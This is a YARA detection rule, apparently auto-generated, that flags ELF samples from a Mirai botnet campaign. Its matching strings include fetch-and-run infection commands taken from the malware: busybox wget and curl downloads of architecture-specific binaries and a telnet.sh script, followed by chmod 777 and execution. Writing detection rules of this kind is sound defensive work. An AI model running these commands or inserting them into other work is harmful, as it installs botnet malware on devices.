rule Sightlines_c2_db637650_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-db637650"
        date = "2026-11-22"
        campaign = "c2-db637650"
        family = "mirai"
        hash = "344f43427c5546fa6f76b4977cb96c8c808d48aaa7fbebe3eb32846b5c2c8be7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-db637650.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "usybox wget http://%s/mips; chmod 777 mips; ./mips selfrep.realtek" ascii
        $s1 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel selfrep.realtek; /bin/b" ascii
        $s2 = "cd /tmp || cd /var || cd /dev/shm;wget http://%s/telnet.sh; curl -O http://%s/telnet.sh; chmod 777 t" ascii
        $s3 = "/proc/%d/task/%d/children" ascii
        $s4 = "Connection: keep-alive" ascii
        $s5 = "[0mNo shell available" ascii
        $s6 = "elnet.sh; sh telnet.sh; " ascii
        $s7 = "[0mAccess granted!" ascii
        $s8 = "[0mWrong password!" ascii
        $s9 = "/usr/bin/watchdogd" ascii
        $s10 = "/usr/sbin/watchdog" ascii
        $s11 = "/dev/misc/watchdog" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}
